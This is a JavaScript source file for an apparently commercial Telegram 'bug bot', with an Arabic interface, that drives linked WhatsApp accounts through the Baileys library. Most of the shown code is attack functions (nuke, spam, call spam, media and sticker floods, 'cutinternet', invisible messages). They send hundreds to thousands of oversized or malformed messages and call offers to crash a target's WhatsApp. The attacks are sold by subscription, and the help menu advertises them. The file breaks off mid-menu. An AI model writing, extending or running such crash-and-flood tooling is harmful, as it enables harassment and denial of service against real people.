// =====================================================================
// raju.js - Xzeso Bug Bot V6.0 - Complete Arabic Edition
// =====================================================================
// Full Feature Set: Attack Commands, Admin Panel, WhatsApp Integration
// Subscription System, Maintenance Mode, Free Mode
// Total: Complete Rewrite
// =====================================================================

const { Bot, InlineKeyboard, InputFile } = require("grammy");
const fs = require("fs");
const path = require("path");
const { exec } = require("child_process");
const crypto = require("crypto");
const os = require("os");
const axios = require("axios");
const chalk = require("chalk");
const {
  default: makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  useSingleFileAuthState,
  fetchLatestBaileysVersion,
  fetchLatestWaWebVersion,
  DisconnectReason,
  generateWAMessage,
  generateWAMessageContent,
  generateWAMessageFromContent,
  jidDecode,
  encodeSignedDeviceIdentity,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const { Boom } = require("@hapi/boom");
const config = require("./config");
const cooldownModule = require("./controlSystem/cooldown.js");
const cooldown = require("./controlSystem/cooldown.js");

// =====================================================================
// System Variables
// =====================================================================

const thumbnail = fs.existsSync("./storage/thumbnail.jpg")
  ? fs.readFileSync("./storage/thumbnail.jpg")
  : null;

const CHANNEL_ID = config.chanelid || "apsanad70";
const GROUP_ID = config.chatgrupid || "sanadcrash";
const ERROR_CHANNEL = config.errorChannel || "sanadcrash_errors";
const SESSION_DIR = path.join(".", "session");

// Free mode allowed commands
const FREE_COMMANDS = ["start", "help", "stats", "ping", "botinfo", "listpair", "sessions", "reqpair", "clearsesi"];

// All attack commands
const ATTACK_COMMANDS = ["nuke", "spam", "call", "media", "sticker", "cutinternet", "invisisendx", "ghost", "mass", "shield", "stealth"];

// Admin-only commands
const ADMIN_COMMANDS = ["admin", "adminpanel", "addadmin", "deladmin", "listadmin", "makencode", "listcodes", "delcode", "toggle_free_mode", "toggle_maintenance", "setbotpic", "broadcast", "broadcastall", "killall", "killuser", "clearsender", "clearcache", "setcd", "cdon", "cdoff"];

["session", "storage", "database", "temp"].forEach(dir => {
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
});

// =====================================================================
// Error Logger to Channel
// =====================================================================

async function logErrorToChannel(error, command = "") {
  try {
    const errorMsg = `🔴 <b>خطأ في البوت</b>\n\n⚙️ الأمر: <code>/${command}</code>\n❌ الخطأ: <code>${error.message}</code>\n🕐 الوقت: ${new Date().toLocaleString("ar-EG")}`;
    await bot.api.sendMessage(ERROR_CHANNEL, errorMsg, { parse_mode: "HTML" }).catch(() => {});
  } catch {}
}

// =====================================================================
// Middleware: Command Restriction
// =====================================================================

// =====================================================================
// Logging System
// =====================================================================

const log = {
  success: (msg) => console.log(chalk.green.bold("✓ ") + chalk.white(msg)),
  error: (msg) => console.log(chalk.red.bold("✗ ") + chalk.white(msg)),
  warning: (msg) => console.log(chalk.yellow.bold("⚠ ") + chalk.white(msg)),
  info: (msg) => console.log(chalk.blue.bold("ℹ ") + chalk.white(msg)),
  loading: (msg) => console.log(chalk.magenta.bold("⏳ ") + chalk.white(msg)),
  user: (msg) => console.log(chalk.cyan.bold("👤 ") + chalk.white(msg)),
  whatsapp: (msg) => console.log(chalk.green.bold("📱 ") + chalk.white(msg)),
  telegram: (msg) => console.log(chalk.blue.bold("✈️ ") + chalk.white(msg)),
  system: (msg) => console.log(chalk.gray.bold("⚙️  ") + chalk.white(msg)),
  admin: (msg) => console.log(chalk.red.bold("👑 ") + chalk.white(msg)),
  crash: (msg) => console.log(chalk.yellow.bold("💥 ") + chalk.white(msg)),
};

// =====================================================================
// Statistics Tracker
// =====================================================================

const stats = {
  totalCommands: 0,
  crashCommands: 0,
  adminCommands: 0,
  waConnections: 0,
  errors: 0,
  startTime: Date.now(),
  users: new Map(),
  sessions: new Map(),
  increment(type) {
    if (type === 'command') this.totalCommands++;
    if (type === 'crash') this.crashCommands++;
    if (type === 'admin') this.adminCommands++;
    if (type === 'wa') this.waConnections++;
    if (type === 'error') this.errors++;
  },
  addUser(userId, data = {}) {
    this.users.set(userId, { ...data, joined: Date.now() });
  },
  getSessionCount() { return Object.keys(waClients).length; },
  getUptime() { return Math.floor((Date.now() - this.startTime) / 1000); },
  toJSON() {
    return {
      totalCommands: this.totalCommands,
      crashCommands: this.crashCommands,
      adminCommands: this.adminCommands,
      errors: this.errors,
      uptime: this.getUptime(),
      activeSessions: this.getSessionCount(),
      totalUsers: this.users.size,
    };
  }
};

// =====================================================================
// Safe File Operations
// =====================================================================

function safeReadJSON(filePath, defaultValue = {}) {
  try {
    const fullPath = path.isAbsolute(filePath) ? filePath : path.join(__dirname, filePath);
    if (fs.existsSync(fullPath)) return JSON.parse(fs.readFileSync(fullPath, "utf8"));
    return defaultValue;
  } catch (err) {
    console.error(`[safeRead] ${filePath}: ${err.message}`);
    return defaultValue;
  }
}

function safeWriteJSON(filePath, data) {
  try {
    const fullPath = path.isAbsolute(filePath) ? filePath : path.join(__dirname, filePath);
    const dir = path.dirname(fullPath);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(fullPath, JSON.stringify(data, null, 2), "utf8");
    return true;
  } catch (err) {
    console.error(`[safeWrite] ${filePath}: ${err.message}`);
    return false;
  }
}

// =====================================================================
// Load Databases
// =====================================================================

const accessDb = safeReadJSON("./storage/access.json", { users: [] });
const resDb = safeReadJSON("./storage/resellers.json", { users: [] });
let settingsDb = safeReadJSON("./database/settings.json", { freeMode: false, maintenance: false, maintenanceMsg: "", botImage: "", admins: [], permissions: {} });
const usersDb = safeReadJSON("./database/users.json", []);

// Ensure settings structure
if (!settingsDb.admins) settingsDb.admins = [];
if (!settingsDb.permissions) settingsDb.permissions = {};
if (!settingsDb.maintenance) settingsDb.maintenance = false;
if (!settingsDb.maintenanceMsg) settingsDb.maintenanceMsg = "🛠️ البوت في وضع الصيانة. سنعود قريباً.";
if (!settingsDb.botImage) settingsDb.botImage = "";
safeWriteJSON("./database/settings.json", settingsDb);

// =====================================================================
// Bot Initialization
// =====================================================================

const bot = new Bot(config.telegramBotToken || "YOUR_BOT_TOKEN");
bot.use(async (ctx, next) => {
  try {
    if (ctx.message && ctx.chat?.type === "private") {
      const userId = ctx.from.id.toString();
      const text = ctx.message.text || "";
      const cmd = text.split(" ")[0]?.replace("/", "").toLowerCase();

      // Check maintenance mode
      if (isMaintenance() && !isOwner(userId) && !isAdmin(userId)) {
        return ctx.reply(`🛠️ <b>البوت في وضع الصيانة</b>\n\n${getMaintenanceMessage()}`, { parse_mode: "HTML" });
      }

      // Check free mode restrictions
      if (isFreeMode()) {
        if (ATTACK_COMMANDS.includes(cmd)) {
          return ctx.reply("🆓 <b>الوضع المجاني</b>\n⚠️ أوامر الهجوم غير متاحة في الوضع المجاني\n🔑 اشترك للوصول الكامل: /menu_subscriptions", { parse_mode: "HTML" });
        }
        if (ADMIN_COMMANDS.includes(cmd)) {
          return ctx.reply("🆓 <b>الوضع المجاني</b>\n⚠️ أوامر الأدمن غير متاحة", { parse_mode: "HTML" });
        }
      }

      // Check admin commands
      if (ADMIN_COMMANDS.includes(cmd)) {
        if (!isOwner(userId) && !isAdmin(userId)) {
          return ctx.reply("❌ هذا الأمر مخصص للمالك والمسؤولين فقط!");
        }
      }

      // Check access for attack commands
      if (ATTACK_COMMANDS.includes(cmd)) {
        if (!hasAccess(userId)) {
          return ctx.reply(getNoAccessMessage());
        }
      }
    }
    await next();
  } catch (err) {
    log.error(`Middleware error: ${err.message}`);
  }
});

// =====================================================================
// Utility Functions
// =====================================================================

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const formatUptime = (sec) => {
  const h = Math.floor(sec / 3600);
  const m = Math.floor((sec % 3600) / 60);
  const s = Math.floor(sec % 60);
  return `${h}h ${m}m ${s}s`;
};
const isOwner = (userId) => String(userId) === String(config.ownerId || "6707747395");
const isAdmin = (userId) => (settingsDb.admins || []).includes(String(userId));
const hasAdminPermission = (userId, perm) => (settingsDb.permissions || {})[String(userId)]?.[perm] ?? true;
const isReseller = (userId) => resDb.users && resDb.users.includes(String(userId));
const isFreeMode = () => settingsDb.freeMode === true;
const isMaintenance = () => settingsDb.maintenance === true;
const getMaintenanceMessage = () => settingsDb.maintenanceMsg || "🛠️ البوت في وضع الصيانة.";
const hasAccess = (userId) => {
  if (isFreeMode()) return true;
  if (isOwner(userId)) return true;
  if (isReseller(userId)) return true;
  if (accessDb.users && accessDb.users.includes(String(userId))) return true;
  if (settingsDb.admins && settingsDb.admins.includes(String(userId))) return true;
  return false;
};
const isBlocked = (number) => {
  const bl = safeReadJSON("./storage/blacklist.json", []);
  return bl.includes(number);
};

// =====================================================================
// Message Helper
// =====================================================================

function getNoAccessMessage() {
  return `<blockquote>
<b>🔒 الوصول محظور</b>

⚠️ ليس لديك صلاحية الوصول لهذا البوت.

━━━━━━━━━━━━━
💠 أسعار الوصول:
• وصول أساسي: 4$ / شهرياً
• وصول مدى الحياة: 7$
━━━━━━━━━━━━━
✨ مزايا الصلاحية:
• وصول كامل لجميع الميزات
• استخدام غير محدود
• تحديثات تلقائية
• دعم أولوي
━━━━━━━━━━━━━

📩 للتواصل مع المالك:
Telegram: @${CHANNEL_ID.replace("@", "")}
</blockquote>`;
}

function getMainMenuKeyboard(userId = null) {
  const isAdminUser = userId ? (isOwner(userId) || isAdmin(userId)) : false;
  const keyboard = new InlineKeyboard()
    .text("🔥 الأوامر", "menu_attacks")
    .text("📱 الجلسات", "menu_sessions");
  if (isAdminUser) {
    keyboard.row()
      .text("⚙️ الإعدادات", "menu_settings")
      .text("👨‍💻 المطور", "menu_developer");
  } else {
    keyboard.row()
      .text("🎫 الاشتراكات", "menu_subscriptions")
      .text("🆓 مجاني", "menu_free");
  }
  keyboard.row()
    .text("🛠️ الصيانة", "menu_maintenance");
  if (isAdminUser) {
    keyboard.text("👑 الأدمن", "menu_admins");
  }
  keyboard.row()
    .url("📢 القناة", `https://t.me/${CHANNEL_ID.replace("@", "")}`);
  return keyboard;
}

function getSettingsKeyboard(userId) {
  return new InlineKeyboard()
    .text("🖼️ صورة البوت", "set_bot_image")
    .text("👥 المسؤولين", "menu_admins")
    .row()
    .text("🔘 الوضع المجاني", "toggle_free_mode")
    .text("🛠️ الصيانة", "toggle_maintenance")
    .row()
    .text("➕➖ الأوامر", "manage_commands")
    .text("🎫 رموز الاشتراك", "manage_codes")
    .row()
    .text("📋 الإحصائيات", "dev_stats")
    .text("📡 قناة الأخطاء", "error_channel")
    .row()
    .text("⬅️ رجوع", "back_to_main");
}

function getDeveloperKeyboard(userId) {
  return new InlineKeyboard()
    .text("📊 الإحصائيات", "dev_stats")
    .text("🔧 أدوات", "dev_tools")
    .row()
    .text("📋 سجلات الأخطاء", "dev_logs")
    .text("📡 قناة الأخطاء", "error_channel")
    .row()
    .text("⚙️ الإعدادات", "menu_settings")
    .row()
    .text("⬅️ رجوع", "back_to_main");
}

function getAdminKeyboard(userId) {
  return new InlineKeyboard()
    .text("✅ إضافة مسؤول", "admin_add")
    .text("❌ حذف مسؤول", "admin_remove")
    .row()
    .text("📋 قائمة المسؤولين", "admin_list")
    .text("🔑 إدارة الرموز", "admin_codes")
    .row()
    .text("📨 بث جماعي", "admin_broadcast")
    .text("🔌 Kill All", "admin_killall")
    .row()
    .text("📊 إحصائيات البوت", "admin_stats")
    .text("⚙️ إعدادات البوت", "menu_settings")
    .row()
    .text("⬅️ رجوع", "back_to_main");
}

// =====================================================================
// WhatsApp Session Management
// =====================================================================

const waClients = {};
if (!fs.existsSync(SESSION_DIR)) fs.mkdirSync(SESSION_DIR, { recursive: true });

function getSessionPath(userId) { return path.join(SESSION_DIR, String(userId)); }

async function initWhatsappForUser(telegramUserId, notifyUser = true, retryCount = 0) {
  const MAX_RETRIES = 5;
  const RECONNECT_DELAY = 2000;
  const userId = String(telegramUserId);
  const sessionPath = getSessionPath(userId);

  try {
    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const sock = makeWASocket({
      logger: pino({ level: "silent" }),
      auth: state,
      browser: ["Android", "Chrome", "24.0"],
      syncFullHistory: false,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      keepAliveIntervalMs: 30000,
      retryRequestDelayMs: 1000,
      getMessage: async () => ({ conversation: "Message not available" }),
      printQRInTerminal: false,
    });

    sock.ev.on("creds.update", saveCreds);
    waClients[userId] = { sock, status: "connecting", sessionPath, lastActivity: Date.now() };

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update || {};
      try {
        if (connection === "close") {
          const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
          if (reason === DisconnectReason.loggedOut || reason === 401) {
            await deleteSessionForUser(userId);
            try { await bot.api.sendMessage(userId, "🚫 *الجلسة انتهت*\nأعد الربط باستخدام /reqpair", { parse_mode: "Markdown" }); } catch {}
          } else if (retryCount < MAX_RETRIES) {
            setTimeout(() => { if (waClients[userId]) initWhatsappForUser(telegramUserId, notifyUser, retryCount + 1); }, RECONNECT_DELAY);
          }
        } else if (connection === "open") {
          waClients[userId].status = "open";
          waClients[userId].lastActivity = Date.now();
          log.whatsapp(`✅ WhatsApp Connected: ${userId}`);
          if (notifyUser) {
            try { await bot.api.sendMessage(userId, "✅ *تم ربط واتساب بنجاح!*", { parse_mode: "Markdown" }); } catch {}
          }
        }
      } catch (e) { log.error(`Connection update error for ${userId}: ${e.message}`); }
    });

    sock.ev.on("connection.error", (error) => { log.error(`WA Socket error for ${userId}: ${error.message}`); });
    return sock;
  } catch (err) {
    log.error(`Failed to init WA for ${userId}: ${err.message}`);
    return null;
  }
}

async function deleteSessionForUser(userId) {
  try {
    if (waClients[userId]?.sock) { try { waClients[userId].sock.end(); } catch {} }
    delete waClients[userId];
    const p = getSessionPath(userId);
    await fs.promises.rm(p, { recursive: true, force: true });
    log.success(`Session deleted for ${userId}`);
    return true;
  } catch (err) {
    log.error(`Failed to delete session for ${userId}: ${err.message}`);
    return false;
  }
}

async function clearAllSessions() {
  try {
    const folders = fs.existsSync(SESSION_DIR) ? fs.readdirSync(SESSION_DIR) : [];
    for (const f of folders) {
      if (waClients[f]?.sock) { try { waClients[f].sock.end(); } catch {} delete waClients[f]; }
    }
    for (const f of folders) {
      try { await fs.promises.rm(path.join(SESSION_DIR, f), { recursive: true, force: true }); } catch {}
    }
    log.success("All sessions cleared");
    return true;
  } catch (err) {
    log.error(`Failed to clear sessions: ${err.message}`);
    return false;
  }
}

async function requestPairingCode(telegramUserId, phone) {
  const userId = String(telegramUserId);
  if (waClients[userId]) { try { waClients[userId].sock.end(); } catch {} delete waClients[userId]; }
  await initWhatsappForUser(userId, false);
  await sleep(1000);
  const client = waClients[userId]?.sock;
  if (!client) throw new Error("Failed to create WA client");
  if (typeof client.requestPairingCode === "function") return await client.requestPairingCode(phone);
  throw new Error("Pairing code API not available");
}

// =====================================================================
// Attack/Bug Functions - 10x ENHANCED - Kill WhatsApp Instantly
// =====================================================================

async function attackNuke(client, target) {
  try {
    // 500 رسالة متوازية مع payload ضخم
    const payloadSize = 100000;
    const promises = [];
    const batchSize = 50;

    for (let batch = 0; batch < 10; batch++) {
      const batchPromises = [];
      for (let i = 0; i < batchSize; i++) {
        const msg = generateWAMessageFromContent(target, {
          message: {
            viewOnceMessage: {
              message: {
                messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
                interactiveMessage: {
                  body: { text: "💥".repeat(payloadSize) },
                  carouselMessage: { cards: Array(50).fill({ body: { text: "🔥".repeat(10000) }, nativeFlowMessage: { buttons: [] } }) }
                }
              }
            }
          }
        }, {});
        batchPromises.push(client.relayMessage(target, { message: msg.message }, { messageId: msg.key.id }).catch(() => {}));
      }
      promises.push(Promise.all(batchPromises));
      await sleep(100);
    }
    await Promise.all(promises);
    log.crash(`NUKE 10x: 500 messages sent to ${target} 💥`);
  } catch (err) { log.error(`NUKE error: ${err.message}`); }
}

async function attackMass(client, targets) {
  try {
    const promises = [];
    for (const target of targets) {
      for (let i = 0; i < 200; i++) {
        const msg = generateWAMessageFromContent(target, {
          message: {
            viewOnceMessage: {
              message: {
                messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
                interactiveMessage: {
                  body: { text: "🎯".repeat(50000) },
                  carouselMessage: { cards: Array(100).fill({ body: { text: "💥".repeat(10000) }, nativeFlowMessage: { buttons: [] } }) }
                }
              }
            }
          }
        }, {});
        promises.push(client.relayMessage(target, { message: msg.message }, { messageId: msg.key.id }).catch(() => {}));
      }
    }
    await Promise.all(promises.slice(0, 500));
    log.crash(`MASS 10x: ${targets.length} targets × 200 messages`);
  } catch (err) { log.error(`MASS error: ${err.message}`); }
}

async function attackGhost(client, target) {
  try {
    // 500 رسالة خفية مع viewOnceMessage مزدوج
    const promises = [];
    for (let i = 0; i < 500; i++) {
      const msg = generateWAMessageFromContent(target, {
        message: {
          viewOnceMessage: {
            message: {
              messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
              interactiveMessage: {
                body: { text: "👻".repeat(20000) },
                carouselMessage: { cards: Array(50).fill({ body: { text: " ".repeat(10000) }, nativeFlowMessage: { buttons: [] } }) }
              }
            }
          }
        }
      }, {});
      promises.push(client.relayMessage(target, { message: msg.message }, { messageId: msg.key.id }).catch(() => {}));
      if (i % 50 === 0) await sleep(50);
    }
    await Promise.all(promises);
    log.crash(`GHOST 10x: 500 hidden messages to ${target} 👻`);
  } catch (err) { log.error(`GHOST error: ${err.message}`); }
}

// =====================================================================
// NEW ATTACK FUNCTIONS - 10x ENHANCED
// =====================================================================

async function attackSpam(client, target) {
  try {
    // 2000 رسالة في 10 دفعات متوازية
    const promises = [];
    const batchSize = 200;
    for (let batch = 0; batch < 10; batch++) {
      const batchPromises = [];
      for (let i = 0; i < batchSize; i++) {
        const msg = generateWAMessageFromContent(target, {
          message: { conversation: `📨 SPAM ${batch * batchSize + i}/2000 | ⚡ XZESO ⚡` }
        }, {});
        batchPromises.push(client.relayMessage(target, { message: msg.message }, { messageId: msg.key.id }).catch(() => {}));
      }
      promises.push(Promise.all(batchPromises));
      await sleep(50);
    }
    await Promise.all(promises);
    log.crash(`SPAM 10x: 2000 messages to ${target} 💬`);
  } catch (err) { log.error(`SPAM error: ${err.message}`); }
}

async function attackCallSpam(client, target) {
  try {
    // 500 مكالمة صوتية
    const devices = (await client.getUSyncDevices([target], false, false))
      .map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
    await client.assertSessions(devices);
    const callTargets = devices.length > 0 ? devices : [target];

    const promises = [];
    for (let i = 0; i < 500; i++) {
      const callNode = {
        tag: "call",
        attrs: { to: target, id: client.generateMessageTag(), from: client.user.id },
        content: [{ tag: "offer", attrs: { "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(), "call-creator": client.user.id },
          content: [
            { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
            { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
            { tag: "net", attrs: { medium: "3" } },
            { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
            { tag: "encopt", attrs: { keygen: "2" } },
            { tag: "destination", attrs: {}, content: [] }
          ]
        }]
      };
      promises.push(client.sendNode(callNode).catch(() => {}));
      if (i % 50 === 0) await sleep(50);
    }
    await Promise.all(promises);
    log.crash(`CALL SPAM 10x: 500 calls to ${target} 📞`);
  } catch (err) { log.error(`CALL SPAM error: ${err.message}`); }
}

async function attackMediaFlood(client, target) {
  try {
    // 1000 ستكر ضخم 10x9999 مع payload مختلف لكل واحد
    const urls = [
      "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
      "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true"
    ];
    const promises = [];
    for (let i = 0; i < 1000; i++) {
      const stickerData = urls[i % urls.length];
      const msg = generateWAMessageFromContent(target, {
        message: {
          stickerMessage: {
            url: stickerData,
            mimetype: "image/webp",
            fileLength: "99999999",
            height: 9999, width: 9999,
            mediaKey: crypto.randomBytes(32).toString("base64"),
            fileEncSha256: crypto.randomBytes(32).toString("base64"),
            fileSha256: crypto.randomBytes(32).toString("base64"),
            directPath: "/v/t62.7118-24/" + crypto.randomBytes(16).toString("hex"),
            mediaKeyTimestamp: Date.now().toString()
          }
        }
      }, {});
      promises.push(client.relayMessage(target, { message: msg.message }, { messageId: msg.key.id }).catch(() => {}));
      if (i % 100 === 0) await sleep(50);
    }
    await Promise.all(promises);
    log.crash(`MEDIA FLOOD 10x: 1000 stickers to ${target} 🖼️`);
  } catch (err) { log.error(`MEDIA FLOOD error: ${err.message}`); }
}

async function attackHiddenStickers(client, target) {
  try {
    // 2000 ستكر مخفي ضخم مع payload ضخم جداً
    const payload = "🔥".repeat(100000);
    const promises = [];
    for (let i = 0; i < 2000; i++) {
      const msg = generateWAMessageFromContent(target, {
        message: {
          stickerMessage: {
            url: `https://mmg.whatsapp.net/v/t62.7118-24/${crypto.randomBytes(32).toString("hex")}.enc`,
            mimetype: "image/webp",
            fileLength: "999999999",
            height: 99999, width: 99999,
            mediaKey: crypto.randomBytes(64).toString("base64"),
            fileEncSha256: crypto.randomBytes(64).toString("base64"),
            fileSha256: crypto.randomBytes(64).toString("base64"),
            directPath: "/" + crypto.randomBytes(32).toString("hex"),
            mediaKeyTimestamp: Date.now().toString(),
            jpegThumbnail: payload,
            caption: payload
          }
        }
      }, {});
      promises.push(client.relayMessage(target, { message: msg.message }, { messageId: msg.key.id }).catch(() => {}));
      if (i % 200 === 0) await sleep(50);
    }
    await Promise.all(promises);
    log.crash(`HIDDEN STICKERS 10x: 2000 invisible stickers to ${target} 📸`);
  } catch (err) { log.error(`HIDDEN STICKERS error: ${err.message}`); }
}

async function attackCutInternet(client, target) {
  try {
    // إرسال payloads ضخمة جداً لتعطل الشبكة بالكامل
    const payload1 = "K".repeat(200000);
    const payload2 = "\x00".repeat(200000);
    const promises = [];

    // دفعة 1: viewOnceMessage مع payload ضخم
    for (let i = 0; i < 50; i++) {
      const msg = generateWAMessageFromContent(target, {
        message: {
          viewOnceMessage: {
            message: {
              messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
              interactiveMessage: {
                body: { text: payload1 },
                header: { hasMediaAttachment: false },
                nativeFlowMessage: { buttons: [], messageParamsJson: payload2 }
              }
            }
          }
        }
      }, { ephemeralExpiration: 0 });
      promises.push(client.relayMessage(target, { message: msg.message }, { messageId: msg.key.id }).catch(() => {}));
    }

    // دفعة 2: conversation messages ضخمة
    for (let i = 0; i < 50; i++) {
      const msg = generateWAMessageFromContent(target, {
        message: { conversation: "🔌 " + "K".repeat(100000) + " Internet Cut Attack " + i }
      }, {});
      promises.push(client.relayMessage(target, { message: msg.message }, { messageId: msg.key.id }).catch(() => {}));
    }

    // دفعة 3: صور ستكر ضخمة
    for (let i = 0; i < 30; i++) {
      const msg = generateWAMessageFromContent(target, {
        message: {
          stickerMessage: {
            url: `https://mmg.whatsapp.net/v/t62.7118-24/${crypto.randomBytes(32).toString("hex")}.enc`,
            mimetype: "image/webp",
            fileLength: "999999999",
            height: 99999, width: 99999,
            mediaKey: crypto.randomBytes(32).toString("base64"),
            fileEncSha256: crypto.randomBytes(32).toString("base64"),
            fileSha256: crypto.randomBytes(32).toString("base64")
          }
        }
      }, {});
      promises.push(client.relayMessage(target, { message: msg.message }, { messageId: msg.key.id }).catch(() => {}));
    }

    await Promise.all(promises);
    log.crash(`CUT INTERNET 10x: 130+ packets to ${target} 🔌`);
  } catch (err) { log.error(`CUT INTERNET error: ${err.message}`); }
}

// =====================================================================
// COMMAND: /invisisendx (Invisible Send - Invisible Messages)
// =====================================================================

async function attackInvisisendx(client, target) {
  try {
    // 1000 رسالة غير مرئية مع viewOnceMessage و ephemeral messages
    const payload = "🔒".repeat(50000);
    const promises = [];
    const batchSize = 100;

    for (let batch = 0; batch < 10; batch++) {
      const batchPromises = [];
      for (let i = 0; i < batchSize; i++) {
        const msg = generateWAMessageFromContent(target, {
          message: {
            viewOnceMessage: {
              message: {
                messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
                interactiveMessage: {
                  body: { text: payload + ` INVISIBLE ${batch * batchSize + i}` },
                  header: { hasMediaAttachment: true },
                  carouselMessage: { cards: Array(50).fill({ body: { text: " ".repeat(20000) }, nativeFlowMessage: { buttons: [] } }) }
                }
              }
            }
          }
        }, { ephemeralExpiration: 86400 });
        batchPromises.push(client.relayMessage(target, { message: msg.message }, { messageId: msg.key.id }).catch(() => {}));
      }
      promises.push(Promise.all(batchPromises));
      await sleep(80);
    }
    await Promise.all(promises);
    log.crash(`INVISIBLE SEND 10x: 1000 invisible messages to ${target} 🔒`);
  } catch (err) { log.error(`INVISIBLE SEND error: ${err.message}`); }
}

// =====================================================================
// Bot Profile Image Management
// =====================================================================

function setBotImageUrl(url) {
  settingsDb.botImage = url;
  safeWriteJSON("./database/settings.json", settingsDb);
  return { success: true };
}

function getBotImageUrl() {
  return settingsDb.botImage || config.thumburl || "https://i.imgur.com/9Jk5Q2L.jpg";
}

function getPhotoOptions(caption, keyboard) {
  const url = getBotImageUrl();
  return {
    caption,
    parse_mode: "HTML",
    reply_markup: keyboard
  };
}

// =====================================================================
// Middleware: Error Handling
// =====================================================================

bot.use(async (ctx, next) => {
  try { await next(); } catch (err) {
    log.error(`Middleware error: ${err.message}`);
    try { await bot.api.sendMessage(config.ownerId || "6707747395", `🔥 خطأ: ${err.message}`, { parse_mode: "Markdown" }); } catch {}
  }
});

// =====================================================================
// Middleware: User Registration
// =====================================================================

bot.use(async (ctx, next) => {
  try {
    if (ctx.chat?.type === "private") {
      const id = ctx.from.id.toString();
      if (!usersDb.includes(id)) {
        usersDb.push(id);
        safeWriteJSON("./database/users.json", usersDb);
        log.user(`New user: ${id}`);
        try { await bot.api.sendMessage(config.ownerId || "6707747395", `👤 مستخدم جديد: ${id}`); } catch {}
      }
    }
    await next();
  } catch {}
});

// =====================================================================
// COMMAND: /start
// =====================================================================

bot.command("start", async (ctx) => {
  try {
    const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    const uptime = formatUptime(process.uptime());
    const memUsed = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1);

    const caption = `<blockquote>
<b>👋 أهلاً بك يا ${username}!</b>

━━━━━━━━━━━━━━━━━━━━━━━
🔥 <b>Xzeso Bug Bot V6.0</b>
━━━━━━━━━━━━━━━━━━━━━━━

⏱️ التشغيل: ${uptime}
💾 الذاكرة: ${memUsed} MB
👥 المستخدمين: ${usersDb.length}
📱 الجلسات: ${Object.keys(waClients).length}

━━━━━━━━━━━━━━━━━━━━━━━
📢 اختر من القائمة أدناه:
━━━━━━━━━━━━━━━━━━━━━━━
</blockquote>`;

     await ctx.reply(caption, {
       parse_mode: "HTML", reply_markup: getMainMenuKeyboard(ctx.from.id.toString())
     });
  } catch (err) {
    log.error(`Start error: ${err.message}`);
    try { await ctx.reply("❌ حدث خطأ. حاول مرة أخرى."); } catch {}
  }
});

// =====================================================================
// COMMAND: /help
// =====================================================================

bot.command("help", async (ctx) => {
  const helpText = `<blockquote>
<b>📖 قائمة الأوامر - النسخة العربية</b>

━━━━━━━━━━━━━━━━━━━━━━━
🔥 <b>أوامر الهجوم:</b>
/nuke <الرقم> - هجوم نووي (500 رسالة 💥)
/spam <الرقم> - سبام (2000 رسالة 📨)
/call <الرقم> - قرصنة صوتية (500 مكالمة 📞)
/media <الرقم> - فيضان صور (1000 ستكر 🖼️)
/sticker <الرقم> - ستكرات مخفية (2000 📸)
/cutinternet <الرقم> - قطع الإنترنت (130+ حزمة 🔌)
/invisisendx <الرقم> - رسائل غير مرئية (1000 🔒)
/ghost <الرقم> - هجوم خفي (500 رسالة 👻)
/mass <رقم1,رقم2> - هجوم متعدد 🎯
/shield <الرقم> - درع حماية 🛡️
/stealth <الرقم> - وضع التسلل 🗡️
━━━━━━━━━━━━━━━━━━━━━━━
📱 <b>أوامر الجلسات:</b>
/reqpair <رقم> - ربط واتساب
/clearsesi - حذف جلسة
/listpair - عرض الجلسات
/sessions - إحصائيات الجلسات
━━━━━━━━━━━━━━━━━━━━━━━
⚙️ <b>أوامر الإعدادات:</b>
/setbotpic - تغيير صورة البوت
/admin - لوحة الأدمن
/addadmin <id> - إضافة مسؤول
/deladmin <id> - حذف مسؤول
/listadmin - قائمة المسؤولين
/addcmd <اسم> <رد> - أمر مخصص
/delcmd <اسم> - حذف أمر مخصص
━━━━━━━━━━━━━━━━━━━━━━━
🎫 <b>أوامر الاشتراكات:</b>
/makencode <ساعات> - إنشاء رمز
/redeem <رمز> - تفعيل رمز
/listcodes - عرض الرموز
/delcode <رمز> - حذف رمز
━━━━━━━━━━━━━━━━━━━━━━━
🆓 <b>الوضع المجاني:</b>
/freemode - تفعيل الوضع المجاني
━━━━━━━━━━━━━━━━━━━━━━━
🛠️ <b>الصيانة:</b>
/maintmode - وضع الصيانة
/maintmsg <رسالة> - رسالة الصيانة
━━━━━━━━━━━━━━━━━━━━━━━
👨‍💻 <b>المطور:</b>
/botinfo - معلومات البوت
/stats - الإحصائيات
/ping - اختبار السرعة
/broadcast <رسالة> - بث رسالة
━━━━━━━━━━━━━━━━━━━━━━━
📋 <b>الإدارة:</b>
